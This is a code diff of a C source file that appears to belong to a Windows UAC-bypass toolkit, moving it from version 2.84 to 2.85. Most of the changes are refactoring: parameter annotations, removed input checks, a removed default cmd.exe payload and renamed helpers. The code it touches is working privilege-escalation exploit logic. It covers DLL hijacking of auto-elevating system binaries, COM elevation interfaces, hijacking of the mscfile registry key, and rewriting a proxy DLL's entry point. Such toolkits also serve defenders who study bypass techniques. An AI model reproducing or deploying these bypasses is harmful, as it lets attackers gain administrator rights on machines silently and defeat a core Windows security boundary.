@@ -4,9 +4,9 @@
 *
 *  TITLE:       HYBRIDS.C
 *
-*  VERSION:     2.84
+*  VERSION:     2.85
 *
-*  DATE:        22 Nov 2017
+*  DATE:        01 Dec 2017
 *
 *  Hybrid UAC bypass methods.
 *
@@ -31,8 +31,8 @@ ELOAD_PARAMETERS_SIREFEF g_ElevParamsSirefef;
 *
 */
 BOOL ucmAvrfMethod(
-    CONST PVOID AvrfDll,
-    DWORD AvrfDllSize
+    _In_ PVOID AvrfDll,
+    _In_ DWORD AvrfDllSize
 )
 {
     BOOL bResult = FALSE, cond = FALSE, bWusaNeedCleanup = FALSE;
@@ -44,14 +44,6 @@ BOOL ucmAvrfMethod(
 
     UNICODE_STRING ustr;
     OBJECT_ATTRIBUTES obja;
-
-    if (
-        (AvrfDll == NULL) ||
-        (AvrfDllSize == 0)
-        )
-    {
-        return bResult;
-    }
 
     do {
 
@@ -169,10 +161,10 @@ BOOL ucmAvrfMethod(
 *
 */
 BOOL ucmWinSATMethod(
-    LPWSTR lpTargetDll,
-    PVOID ProxyDll,
-    DWORD ProxyDllSize,
-    BOOL UseWusa
+    _In_ LPWSTR lpTargetDll,
+    _In_ PVOID ProxyDll,
+    _In_ DWORD ProxyDllSize,
+    _In_ BOOL UseWusa
 )
 {
     BOOL bResult = FALSE, cond = FALSE;
@@ -180,15 +172,6 @@ BOOL ucmWinSATMethod(
     WCHAR szSource[MAX_PATH * 2];
     WCHAR szDest[MAX_PATH * 2];
     WCHAR szBuffer[MAX_PATH * 2];
-
-    if (
-        (ProxyDll == NULL) ||
-        (ProxyDllSize == 0) ||
-        (lpTargetDll == NULL)
-        )
-    {
-        return bResult;
-    }
 
     if (_strlen(lpTargetDll) > 100) {
         return bResult;
@@ -308,20 +291,16 @@ BOOL ucmWinSATMethod(
 *
 */
 BOOL ucmMMCMethod(
-    UCM_METHOD Method,
-    LPWSTR lpTargetDll,
-    PVOID ProxyDll,
-    DWORD ProxyDllSize
+    _In_ UCM_METHOD Method,
+    _In_ LPWSTR lpTargetDll,
+    _In_ PVOID ProxyDll,
+    _In_ DWORD ProxyDllSize
 )
 {
     BOOL bResult = FALSE, cond = FALSE;
     LPWSTR lpMscFile = NULL;
     WCHAR szSource[MAX_PATH * 2];
     WCHAR szDest[MAX_PATH * 2];
-
-    if ((ProxyDll == NULL) || (ProxyDllSize == 0) || (lpTargetDll == NULL)) {
-        return bResult;
-    }
 
     if (_strlen(lpTargetDll) > 100) {
         return bResult;
@@ -399,7 +378,7 @@ BOOL ucmMMCMethod(
 *
 */
 DWORD WINAPI ucmElevatedLaunchProc(
-    ELOAD_PARAMETERS_SIREFEF *elvpar
+    _In_ ELOAD_PARAMETERS_SIREFEF *elvpar
 )
 {
     SHELLEXECUTEINFOW   shexec;
@@ -511,8 +490,8 @@ PZA_CONTROL_CONTEXT ucmSirefefBuildControlContext(
 *
 */
 BOOL ucmSirefefMethod(
-    PVOID ProxyDll,
-    DWORD ProxyDllSize
+    _In_ PVOID ProxyDll,
+    _In_ DWORD ProxyDllSize
 )
 {
     BOOL                      bResult = FALSE, bCond = FALSE;
@@ -527,14 +506,6 @@ BOOL ucmSirefefMethod(
     PIMAGE_FILE_HEADER        fh = (PIMAGE_FILE_HEADER)((char *)pdosh + pdosh->e_lfanew + sizeof(DWORD));
     PIMAGE_OPTIONAL_HEADER    opth = (PIMAGE_OPTIONAL_HEADER)((char *)fh + sizeof(IMAGE_FILE_HEADER));
     LPVOID                    remotebuffer = NULL, newEp, newDp;
-
-    if (
-        (ProxyDll == NULL) ||
-        (ProxyDllSize == 0)
-        )
-    {
-        return bResult;
-    }
 
     do {
         za_ctx = ucmSirefefBuildControlContext();
@@ -648,25 +619,15 @@ BOOL ucmSirefefMethod(
 *
 */
 BOOL ucmGenericAutoelevation(
-    LPWSTR lpTargetApp,
-    LPWSTR lpTargetDll,
-    PVOID ProxyDll,
-    DWORD ProxyDllSize
+    _In_ LPWSTR lpTargetApp,
+    _In_ LPWSTR lpTargetDll,
+    _In_ PVOID ProxyDll,
+    _In_ DWORD ProxyDllSize
 )
 {
     BOOL bResult = FALSE, cond = FALSE;
     WCHAR szSource[MAX_PATH * 2];
     WCHAR szDest[MAX_PATH * 2];
-
-    if (
-        (ProxyDll == NULL) ||
-        (ProxyDllSize == 0) ||
-        (lpTargetApp == NULL) ||
-        (lpTargetDll == NULL)
-        )
-    {
-        return bResult;
-    }
 
     if (_strlen(lpTargetDll) > 100) {
         return bResult;
@@ -717,8 +678,8 @@ BOOL ucmGenericAutoelevation(
 *
 */
 BOOL ucmGWX(
-    PVOID ProxyDll,
-    DWORD ProxyDllSize
+    _In_ PVOID ProxyDll,
+    _In_ DWORD ProxyDllSize
 )
 {
     BOOL   bResult = FALSE, cond = FALSE;
@@ -729,9 +690,6 @@ BOOL ucmGWX(
 
     PVOID Data = NULL, Ptr = NULL;
     ULONG DecompressedBufferSize = 0, DataSize = 0;
-
-    if ((ProxyDll == NULL) || (ProxyDllSize == 0))
-        return FALSE;
 
     do {
 
@@ -809,16 +767,16 @@ BOOL ucmGWX(
 }
 
 /*
-* ucmAutoElevateManifestDropDll
+* ucmxAutoElevateManifestDropDll
 *
 * Purpose:
 *
 * Drop target dll for ucmAutoElevateManifest.
 *
 */
-BOOL ucmAutoElevateManifestDropDll(
-    PVOID ProxyDll,
-    DWORD ProxyDllSize
+BOOL ucmxAutoElevateManifestDropDll(
+    _In_ PVOID ProxyDll,
+    _In_ DWORD ProxyDllSize
 )
 {
     WCHAR szDest[MAX_PATH * 2];
@@ -845,8 +803,8 @@ BOOL ucmAutoElevateManifestDropDll(
 *
 */
 BOOL ucmAutoElevateManifestW7(
-    PVOID ProxyDll,
-    DWORD ProxyDllSize
+    _In_ PVOID ProxyDll,
+    _In_ DWORD ProxyDllSize
 )
 {
     BOOL bResult = FALSE, bCond = FALSE;
@@ -883,7 +841,7 @@ BOOL ucmAutoElevateManifestW7(
             break;
         }
 
-        bResult = ucmAutoElevateManifestDropDll(ProxyDll, ProxyDllSize);
+        bResult = ucmxAutoElevateManifestDropDll(ProxyDll, ProxyDllSize);
         if (!bResult) {
             break;
         }
@@ -924,17 +882,14 @@ BOOL ucmAutoElevateManifestW7(
 *
 */
 BOOL ucmAutoElevateManifest(
-    PVOID ProxyDll,
-    DWORD ProxyDllSize
+    _In_ PVOID ProxyDll,
+    _In_ DWORD ProxyDllSize
 )
 {
     BOOL bResult = FALSE, bCond = FALSE;
     WCHAR szDest[MAX_PATH * 2];
     WCHAR szSource[MAX_PATH * 2];
     LPWSTR lpApplication = NULL;
-
-    if ((ProxyDll == NULL) || (ProxyDllSize == 0))
-        return bResult;
 
     do {
 
@@ -967,7 +922,7 @@ BOOL ucmAutoElevateManifest(
             break;
         }
 
-        bResult = ucmAutoElevateManifestDropDll(ProxyDll, ProxyDllSize);
+        bResult = ucmxAutoElevateManifestDropDll(ProxyDll, ProxyDllSize);
         if (!bResult) {
             break;
         }
@@ -1005,10 +960,10 @@ BOOL ucmAutoElevateManifest(
 *
 */
 BOOL ucmInetMgrFindCallback(
-    WIN32_FIND_DATA *fdata,
-    LPWSTR lpDirectory,
-    PVOID ProxyDll,
-    DWORD ProxyDllSize
+    _In_ WIN32_FIND_DATA *fdata,
+    _In_ LPWSTR lpDirectory,
+    _In_ PVOID ProxyDll,
+    _In_ DWORD ProxyDllSize
 )
 {
     BOOL            bCond = FALSE, bSuccess = FALSE;
@@ -1140,10 +1095,10 @@ BOOL ucmInetMgrFindCallback(
 }
 
 typedef BOOL(CALLBACK *UCMX_FIND_FILE_CALLBACK)(
-    WIN32_FIND_DATA *fdata,
-    LPWSTR lpDirectory,
-    PVOID ProxyDll,
-    DWORD ProxyDllSize);
+    _In_ WIN32_FIND_DATA *fdata,
+    _In_ LPWSTR lpDirectory,
+    _In_ PVOID ProxyDll,
+    _In_ DWORD ProxyDllSize);
 
 /*
 * ucmxScanFiles
@@ -1157,8 +1112,8 @@ BOOL ucmxScanFiles(
     _In_ LPWSTR lpDirectory,
     _In_ LPWSTR lpFileType,
     _In_ UCMX_FIND_FILE_CALLBACK Callback,
-    _In_opt_ PVOID ProxyDll,
-    _In_opt_ DWORD ProxyDllSize
+    _In_ PVOID ProxyDll,
+    _In_ DWORD ProxyDllSize
 )
 {
     BOOL bStopEnumeration = FALSE;
@@ -1216,6 +1171,9 @@ BOOL ucmInetMgrMethod(
     WIN32_FIND_DATA fdata;
 
     do {
+
+        if ((ProxyDll == NULL) || (ProxyDllSize == 0))
+            return FALSE;
 
         //target dir
         RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
@@ -1292,12 +1250,12 @@ BOOL ucmInetMgrMethod(
 *
 */
 BOOL ucmSXSMethod(
-    PVOID ProxyDll,
-    DWORD ProxyDllSize,
-    LPWSTR lpTargetDirectory, //single element in system32 with slash at end
-    LPWSTR lpTargetApplication, //executable name
-    LPWSTR lpLaunchApplication, //executable name, must be in same dir as lpTargetApplication
-    BOOL bConsentItself
+    _In_ PVOID ProxyDll,
+    _In_ DWORD ProxyDllSize,
+    _In_opt_ LPWSTR lpTargetDirectory, //single element in system32 with slash at end
+    _In_ LPWSTR lpTargetApplication, //executable name
+    _In_opt_ LPWSTR lpLaunchApplication, //executable name, must be in same dir as lpTargetApplication
+    _In_ BOOL bConsentItself
 )
 {
     BOOL     bCond = FALSE, bResult = FALSE;
@@ -1308,9 +1266,6 @@ BOOL ucmSXSMethod(
     WCHAR szSrc[MAX_PATH * 2], szDst[MAX_PATH * 2];
 
     SXS_SEARCH_CONTEXT sctx;
-
-    if ((ProxyDll == NULL) || (ProxyDllSize == 0))
-        return bResult;
 
     if (lpTargetApplication == NULL)
         return bResult;
@@ -1453,16 +1408,12 @@ BOOL ucmSXSMethod(
 *
 */
 BOOL ucmDismMethod(
-    PVOID ProxyDll,
-    DWORD ProxyDllSize
+    _In_ PVOID ProxyDll,
+    _In_ DWORD ProxyDllSize
 )
 {
     BOOL    bCond = FALSE, bResult = FALSE;
     WCHAR   szSource[MAX_PATH * 2], szDest[MAX_PATH * 2];
-
-
-    if ((ProxyDll == NULL) || (ProxyDllSize == 0))
-        return bResult;
 
     do {
 
@@ -1510,8 +1461,8 @@ BOOL ucmDismMethod(
 *
 */
 BOOL ucmWow64LoggerMethod(
-    PVOID ProxyDll,
-    DWORD ProxyDllSize
+    _In_ PVOID ProxyDll,
+    _In_ DWORD ProxyDllSize
 )
 {
     BOOL bResult = FALSE;
@@ -1557,8 +1508,8 @@ BOOL ucmWow64LoggerMethod(
 *
 */
 BOOL ucmUiAccessMethod(
-    PVOID ProxyDll,
-    DWORD ProxyDllSize
+    _In_ PVOID ProxyDll,
+    _In_ DWORD ProxyDllSize
 )
 {
     BOOL bResult = FALSE, bCond = FALSE;
@@ -1595,7 +1546,7 @@ BOOL ucmUiAccessMethod(
             //
             // Get the new entrypoint.
             //
-            EntryPoint = PELoaderGetProcAddress(DllBase, "_FubukiProc1");
+            EntryPoint = PELoaderGetProcAddress(DllBase, FUBUKI_EXT_ENTRYPOINT);
             if (EntryPoint == NULL)
                 break;
 
@@ -1696,8 +1647,8 @@ BOOL ucmUiAccessMethod(
 *
 */
 BOOL ucmJunctionMethod(
-    PVOID ProxyDll,
-    DWORD ProxyDllSize
+    _In_ PVOID ProxyDll,
+    _In_ DWORD ProxyDllSize
 )
 {
     BOOL bResult = FALSE, bDropComplete = FALSE, bCond = FALSE, bWusaNeedCleanup = FALSE;
@@ -1833,8 +1784,8 @@ BOOL ucmJunctionMethod(
 *
 */
 BOOL ucmSXSMethodDccw(
-    PVOID ProxyDll,
-    DWORD ProxyDllSize
+    _In_ PVOID ProxyDll,
+    _In_ DWORD ProxyDllSize
 )
 {
     BOOL     bCond = FALSE, bResult = FALSE, bWusaNeedCleanup = FALSE;
@@ -1846,9 +1797,6 @@ BOOL ucmSXSMethodDccw(
     WCHAR szBuffer[MAX_PATH * 2], szTarget[MAX_PATH * 2];
 
     SXS_SEARCH_CONTEXT sctx;
-
-    if ((ProxyDll == NULL) || (ProxyDllSize == 0))
-        return bResult;
 
     do {
         //
@@ -1919,6 +1867,8 @@ BOOL ucmSXSMethodDccw(
         if (!ucmWusaExtractViaJunction(szBuffer))
             break;
 
+        Sleep(2000);
+
         //
         // Run target.
         //
@@ -1960,8 +1910,8 @@ BOOL ucmSXSMethodDccw(
 *
 */
 BOOL ucmMethodCorProfiler(
-    PVOID ProxyDll,
-    DWORD ProxyDllSize
+    _In_ PVOID ProxyDll,
+    _In_ DWORD ProxyDllSize
 )
 {
     BOOL     bCond = FALSE, bResult = FALSE;
@@ -1972,9 +1922,6 @@ BOOL ucmMethodCorProfiler(
     LPOLESTR OutputGuidString = NULL;
 
     WCHAR szBuffer[MAX_PATH * 2], szRegBuffer[MAX_PATH * 4];
-
-    if ((ProxyDll == NULL) || (ProxyDllSize == 0))
-        return bResult;
 
     do {
         //
@@ -2072,21 +2019,18 @@ BOOL ucmMethodCorProfiler(
 *
 */
 BOOL ucmFwCplLuaMethod(
-    _In_opt_ LPWSTR lpszPayload
+    _In_ LPWSTR lpszPayload
 )
 {
     HRESULT          r = E_FAIL;
     BOOL             bCond = FALSE;
-    
-    LPWSTR           lpBuffer = NULL;
+
     LRESULT          lResult;
     HKEY             hKey = NULL;
     SIZE_T           sz = 0;
 
     IID              xIIDFwCplLua;
     IFwCplLua       *FwCplLua = NULL;
-
-    WCHAR            szBuffer[MAX_PATH + 1];
 
     do {
 
@@ -2097,34 +2041,21 @@ BOOL ucmFwCplLuaMethod(
             break;
         }
 
-        //
-        // Select payload.
-        //
-        if (lpszPayload != NULL) {
-            lpBuffer = lpszPayload;
-        }
-        else {
-            //no payload specified, use default cmd.exe
-            RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
-            supExpandEnvironmentStrings(T_DEFAULT_CMD, szBuffer, MAX_PATH);
-            lpBuffer = szBuffer;
-        }
-
-        sz = _strlen(lpBuffer);
+        sz = _strlen(lpszPayload);
         if (sz == 0)
             break;
 
         //
         // Create controlled mscfile entry.
         //
-        lResult = RegCreateKeyEx(HKEY_CURRENT_USER, 
+        lResult = RegCreateKeyEx(HKEY_CURRENT_USER,
             T_MSC_SHELL,
-            0, 
+            0,
             NULL,
-            REG_OPTION_NON_VOLATILE, 
-            MAXIMUM_ALLOWED, 
-            NULL, 
-            &hKey, 
+            REG_OPTION_NON_VOLATILE,
+            MAXIMUM_ALLOWED,
+            NULL,
+            &hKey,
             NULL);
 
         if (lResult != ERROR_SUCCESS)
@@ -2139,7 +2070,7 @@ BOOL ucmFwCplLuaMethod(
             TEXT(""),
             0,
             REG_SZ,
-            (BYTE*)lpBuffer,
+            (BYTE*)lpszPayload,
             (DWORD)sz);
 
         if (lResult != ERROR_SUCCESS)
@@ -2193,13 +2124,12 @@ BOOL ucmFwCplLuaMethod(
 *
 */
 BOOL ucmDccwCOMMethod(
-    _In_opt_ LPWSTR lpszPayload
+    _In_ LPWSTR lpszPayload
 )
 {
     HRESULT          r = E_FAIL;
     BOOL             bCond = FALSE;
 
-    LPWSTR           lpBuffer = NULL;
     SIZE_T           sz = 0;
 
     IID              xIID_ICMLuaUtil;
@@ -2207,24 +2137,9 @@ BOOL ucmDccwCOMMethod(
     ICMLuaUtil      *CMLuaUtil = NULL;
     IColorDataProxy *ColorDataProxy = NULL;
 
-    WCHAR            szBuffer[MAX_PATH + 1];
-
     do {
 
-        //
-        // Select payload.
-        //
-        if (lpszPayload != NULL) {
-            lpBuffer = lpszPayload;
-        }
-        else {
-            //no payload specified, use default cmd.exe
-            RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
-            supExpandEnvironmentStrings(T_DEFAULT_CMD, szBuffer, MAX_PATH);
-            lpBuffer = szBuffer;
-        }
-
-        sz = _strlen(lpBuffer);
+        sz = _strlen(lpszPayload);
         if (sz == 0)
             break;
 
@@ -2256,7 +2171,7 @@ BOOL ucmDccwCOMMethod(
             HKEY_LOCAL_MACHINE,
             T_DISPLAY_CALIBRATION,
             T_CALIBRATOR_VALUE,
-            lpBuffer);
+            lpszPayload);
 
         if (FAILED(r))
             break;
@@ -2317,16 +2232,11 @@ BOOL ucmDccwCOMMethod(
 *
 */
 BOOL ucmMethodVolatileEnv(
-    PVOID ProxyDll,
-    DWORD ProxyDllSize
+    _In_ PVOID ProxyDll,
+    _In_ DWORD ProxyDllSize
 )
 {
-    BOOL              bResult = FALSE, bCond = FALSE, bEnvSet = FALSE;
-
-    PIMAGE_NT_HEADERS NtHeaders;
-    DWORD             DllVirtualSize;
-    PVOID             EntryPoint, DllBase;
-
+    BOOL  bResult = FALSE, bCond = FALSE, bEnvSet = FALSE;
     WCHAR szBuffer[MAX_PATH * 2];
 
     do {
@@ -2334,36 +2244,7 @@ BOOL ucmMethodVolatileEnv(
         //
         // Replace default Fubuki dll entry point with new and remove dll flag.
         //
-        NtHeaders = RtlImageNtHeader(ProxyDll);
-        if (NtHeaders == NULL)
-            break;
-
-        DllVirtualSize = 0;
-        DllBase = PELoaderLoadImage(ProxyDll, &DllVirtualSize);
-        if (DllBase) {
-
-            //
-            // Get the new entrypoint.
-            //
-            EntryPoint = PELoaderGetProcAddress(DllBase, "_FubukiProc3");
-            if (EntryPoint == NULL)
-                break;
-
-            //
-            // Set new entrypoint and recalculate checksum.
-            //
-            NtHeaders->OptionalHeader.AddressOfEntryPoint =
-                (ULONG)((ULONG_PTR)EntryPoint - (ULONG_PTR)DllBase);
-
-            NtHeaders->FileHeader.Characteristics &= ~IMAGE_FILE_DLL;
-
-            NtHeaders->OptionalHeader.CheckSum =
-                supCalculateCheckSumForMappedFile(ProxyDll, ProxyDllSize);
-
-            VirtualFree(DllBase, 0, MEM_RELEASE);
-
-        }
-        else
+        if (!supConvertDllToExeSetNewEP(ProxyDll, ProxyDllSize, FUBUKI_DEFAULT_ENTRYPOINT))
             break;
 
         //
@@ -2372,7 +2253,7 @@ BOOL ucmMethodVolatileEnv(
         RtlSecureZeroMemory(&szBuffer, sizeof(szBuffer));
         _strcpy(szBuffer, g_ctx.szTempDirectory);
         _strcat(szBuffer, T_KUREND);
-        
+
         if (!CreateDirectory(szBuffer, NULL))
             if (GetLastError() != ERROR_ALREADY_EXISTS)
                 break;
@@ -2401,7 +2282,7 @@ BOOL ucmMethodVolatileEnv(
         //
         _strcat(szBuffer, MMC_EXE);
         if (supWriteBufferToFile(szBuffer, ProxyDll, ProxyDllSize)) {
-           bResult = supRunProcess(PERFMON_EXE, NULL);
+            bResult = supRunProcess(PERFMON_EXE, NULL);
         }
 
     } while (bCond);
